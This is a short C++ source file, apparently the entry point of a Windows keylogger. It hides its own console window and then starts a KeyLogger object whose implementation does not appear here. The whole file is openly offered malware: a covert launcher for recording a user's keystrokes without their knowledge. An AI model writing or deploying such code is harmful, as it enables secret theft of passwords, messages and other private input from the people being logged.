#include "KeyLogger.h"
#include <Windows.h>

int main()
{
	ShowWindow(GetConsoleWindow(), SW_HIDE);
	KeyLogger kl;
	kl.Run();
}